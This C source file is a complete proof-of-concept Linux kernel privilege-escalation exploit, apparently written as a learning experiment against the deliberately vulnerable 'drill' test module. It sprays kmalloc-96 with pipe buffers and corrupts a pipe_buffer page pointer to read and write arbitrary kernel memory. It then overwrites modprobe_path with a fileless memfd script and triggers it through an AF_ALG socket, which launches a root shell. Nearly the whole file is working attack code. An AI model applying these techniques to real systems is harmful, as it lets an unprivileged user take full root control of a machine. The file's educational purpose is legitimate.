/*
 * Funny experiments with Linux kernel exploitation:
 * a basic out-of-bounds writing exploit corrupting the `pipe_buffer.page` pointer
 * to perform arbitrary address reading and writing (AARW) of kernel memory via a pipe.
 *
 * Only basic methods. Just for fun.
 *
 * 1) Use Linux kernel version v6.18 tag (7d0a66e4bb9081d75c82ec4957c50034cb0ea449)
 *
 * 2) Use gcc version 13.3.0
 *
 * 3) Change these options in `defconfig`:
 *   - CONFIG_CONFIGFS_FS=y
 *   - CONFIG_SECURITYFS=y
 *   - CONFIG_DEBUG_INFO=y
 *   - CONFIG_DEBUG_INFO_DWARF5=y
 *   - CONFIG_GDB_SCRIPTS=y
 *
 * 4) Ensure that the CONFIG_RANDOM_KMALLOC_CACHES option is not set to allow
 *    the drill_item_t and pipe_buffer objects to live in the same slab cache.
 *
 * 5) However, you may compile the Linux kernel with slab freelist randomization enabled
 *    (CONFIG_SLAB_FREELIST_RANDOM=y). This PoC can bypass that hardening feature.
 *
 * 6) Run the kernel with disabled KASLR (use the nokaslr boot parameter).
 *
 * This PoC overwrites modprobe_path and gains LPE.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <linux/if_alg.h>
#include "drill.h"

/* clang-format off */
/*
 * Estimate the number of free slots in the kmalloc-96 slabs.
 * In /proc/slabinfo on the target VM we see that:
 * 	num_objs - active_objs = 5670 - 5505 = 165
 * Let's multiply this number by 3.
 */
#define KMALLOC96_HOLES_N	495
#define OBJS_PER_SLAB		42
/*
 * How many pipes do we need:
 * 1) KMALLOC96_HOLES_N to plug the holes in the kmalloc-96 slab cache;
 * 2) OBJS_PER_SLAB to allocate a new active slab, where we will place drill_item_t;
 * 3) OBJS_PER_SLAB to fill that slab completely after allocating drill_item_t.
 */
#define PIPES_N			(KMALLOC96_HOLES_N + OBJS_PER_SLAB * 2)

#define PB_PER_SLAB_SLOT	2
#define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT

/* The following formula is valid only when KASLR is disabled */
#define MODPROBE_PATH_VADDR	0xffffffff82d486a0UL
#define KERNEL_TEXT_VADDR	0xffffffff81000000UL
#define MODPROBE_PATH_OFFSET	(MODPROBE_PATH_VADDR - KERNEL_TEXT_VADDR)
#define KERNEL_TEXT_PHYS_ADDR 	0x1000000UL
#define STRUCT_PAGE_SZ		64UL
#define VMEMMAP_BASE		0xffffea0000000000UL
#define MODPROBE_PATH_PAGE_OFFSET \
	((KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_OFFSET) >> 12) * STRUCT_PAGE_SZ
#define MODPROBE_PATH_PAGE_ADDR	(VMEMMAP_BASE + MODPROBE_PATH_PAGE_OFFSET)
/* clang-format on */

int increase_fd_limit(void)
{
	struct rlimit rlim;

	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] getrlimit");
		return EXIT_FAILURE;
	}

	rlim.rlim_cur = rlim.rlim_max;
	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] setrlimit");
		return EXIT_FAILURE;
	}

	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
		perror("[-] getrlimit");
		return EXIT_FAILURE;
	}

	printf("[+] set maximum file descriptors limit: %ld\n", rlim.rlim_cur);

	return EXIT_SUCCESS;
}

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/* From include/linux/kmod.h */
#define KMOD_PATH_LEN 256

int get_modprobe_path(char *buf, size_t buf_size)
{
	int fd = -1;
	ssize_t bytes = 0;
	int ret = EXIT_FAILURE;
	size_t len = 0;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open modprobe");
		return EXIT_FAILURE;
	}

	bytes = read(fd, buf, buf_size);
	buf[buf_size - 1] = 0;

	ret = close(fd);
	if (ret != 0)
		perror("[-] close modprobe");

	if (bytes < 0) {
		perror("[-] read modprobe");
		return EXIT_FAILURE;
	}

	len = strlen(buf);
	if (len < 1) {
		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	if (buf[len - 1] != '\n') {
		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
		return EXIT_FAILURE;
	}
	buf[len - 1] = 0; /* skip the line feed '\n' */

	return EXIT_SUCCESS;
}

/* Fileless approach */
int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
{
	pid_t pid = getpid();
	int script_fd = -1;
	int shell_stdin_fd = -1;
	int shell_stdout_fd = -1;
	int ret = EXIT_FAILURE;

	script_fd = memfd_create("", MFD_CLOEXEC);
	if (script_fd < 0) {
		perror("[-] memfd_create");
		return EXIT_FAILURE;
	}

	shell_stdin_fd = dup(STDIN_FILENO);
	if (shell_stdin_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	shell_stdout_fd = dup(STDOUT_FILENO);
	if (shell_stdout_fd < 0) {
		perror("[-] dup");
		return EXIT_FAILURE;
	}

	ret = dprintf(script_fd,
		      "#!/bin/sh\n"
		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
	if (ret < 0) {
		perror("[-] dprintf for privesc_script");
		return EXIT_FAILURE;
	}

	ret = lseek(script_fd, 0, SEEK_SET);
	if (ret < 0) {
		perror("[-] lseek for privesc_script");
		return EXIT_FAILURE;
	}

	ret = snprintf(path, path_size, "/proc/%i/fd/%i", pid, script_fd);
	if (ret < 0) {
		perror("[-] snprintf for privesc_script path");
		return EXIT_FAILURE;
	}
	if (ret >= path_size) {
		printf("[-] snprintf for privesc_script path: truncated\n");
		return EXIT_FAILURE;
	}

	printf("[+] privesc script is prepared at %s\n", path);
	return EXIT_SUCCESS;
}

int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
				  const char *modprobe_path, const char *privesc_script_path,
				  int victim_pipe)
{
	size_t modprobe_len = strlen(modprobe_path);
	size_t script_len = strlen(privesc_script_path);

	for (int j = 0; j <= (PIPE_CAPACITY - modprobe_len); j += 8) {
		if (memcmp(pipe_data + j, modprobe_path, modprobe_len) == 0) {
			printf("[+] located \"%s\" at offset 0x%lx of pipe #%d\n", modprobe_path,
			       (unsigned long)j, victim_pipe);
			memcpy(pipe_data + j, privesc_script_path, script_len);
			if (write(pipe_fds[victim_pipe][1], pipe_data, PIPE_CAPACITY) < 0) {
				perror("[-] write");
				exit(EXIT_FAILURE);
			}
			return EXIT_SUCCESS;
		}
	}
	return EXIT_FAILURE;
}

/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
void trigger_modprobe_sock(void)
{
	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
	int alg_fd = -1;

	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
	printf("[!] root shell is finished\n");

	if (alg_fd >= 0) {
		if (close(alg_fd) < 0)
			perror("[-] close alg_fd");
	}
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
	int act_fd = -1;
	long i = 0;
	int pipe_fds[PIPES_N][2];
	char pipe_data[PIPE_CAPACITY];
	char act_args[DRILL_ACT_SIZE] = { 0 };
	int success = 0;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
	ret = increase_fd_limit();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE)
		goto end;

	ret = prepare_privesc_script(privesc_script_path, sizeof(privesc_script_path),
				     modprobe_path);
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	for (i = 0; i < PIPES_N; i++) {
		pipe_fds[i][0] = -1;
		pipe_fds[i][1] = -1;
	}

	memset(pipe_data, 0, sizeof(pipe_data));

	for (i = 0; i < PIPES_N; i++) {
		ret = pipe(pipe_fds[i]);
		if (ret < 0) {
			perror("[-] pipe");
			goto end;
		}

		/*
		 * Change the pipe_buffer array size to 2 * sizeof(struct pipe_buffer),
		 * which is 80 bytes. It should live in kmalloc-96 together with
		 * the drill_item_t object.
		 *
		 * We should resize the pipe capacity right now to avoid hitting
		 * the limit in /proc/sys/fs/pipe-user-pages-soft.
		 */
		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
		if (ret != PIPE_CAPACITY) {
			perror("[-] fcntl");
			goto end;
		}

		if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
			perror("[-] write");
			goto end;
		}

		/*
		 * Let's allocate a drill_item_t object after filling the empty slots
		 * in kmalloc-96 and creating a new slab containing pipe_buffers.
		 * After placing the drill_item_t object in this slab, we will allocate
		 * OBJS_PER_SLAB more pipe_buffers to fill it completely.
		 */
		if (i == KMALLOC96_HOLES_N + OBJS_PER_SLAB) {
			ret = act(act_fd, DRILL_ACT_ALLOC, 0, NULL);
			if (ret == EXIT_FAILURE)
				goto end;
			printf("[+] allocated a vulnerable drill_item_t object\n");
		}
	}
	printf("[+] allocated pipe_buffer objects and a drill_item_t object among them\n");

	printf("[*] trying to corrupt a pipe_buffer near the drill_item_t object...\n");
	/*
	 * Overwrite pipe_buffer.page:
	 *  - the page field in pipe_buffer is at the offset 0;
	 *  - DRILL_ACT_SAVE_VAL with 80 as 2nd argument starts at the offset 96,
	 *    which is exactly at the offset 0 of the next object near drill_item_t.
	 */
	snprintf(act_args, sizeof(act_args), "0x%lx 80", MODPROBE_PATH_PAGE_ADDR);
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, 0, act_args);
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[*] trying to leak modprobe_path...\n");
	for (i = 0; i < PIPES_N; i++) {
		ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
		if (ret < 0) {
			perror("[-] read");
			goto end;
		}
		ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
						    privesc_script_path, i);
		if (ret == EXIT_SUCCESS) {
			success = 1;
			break;
		} else {
			/*
			 * If we scan current pipe and it is not corrupted,
			 * we will write back exactly the same data we read.
			 * It helps to read pipes many times properly.
			 */
			if (write(pipe_fds[i][1], pipe_data, sizeof(pipe_data)) < 0) {
				perror("[-] write");
				goto end;
			}
		}
	}

	if (!success) {
		printf("[-] unable to leak modprobe_path\n");
		goto end;
	}

	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
	if (ret == EXIT_FAILURE || strcmp(modprobe_path, privesc_script_path) != 0) {
		printf("[-] modprobe_path (%s) differs from privesc script (%s)\n", modprobe_path,
		       privesc_script_path);
		goto end;
	}

	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
	trigger_modprobe_sock();
	result = EXIT_SUCCESS;

end:
	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	for (i = 0; i < PIPES_N; i++) {
		if (pipe_fds[i][0] >= 0) {
			if (close(pipe_fds[i][0]) < 0)
				perror("[-] close pipe");
		}
		if (pipe_fds[i][1] >= 0) {
			if (close(pipe_fds[i][1]) < 0)
				perror("[-] close pipe");
		}
	}

	if (result == EXIT_FAILURE)
		printf("\n[-] exploit failed\n");
	else
		printf("\n[+] success, the end\n");

	return result;
}
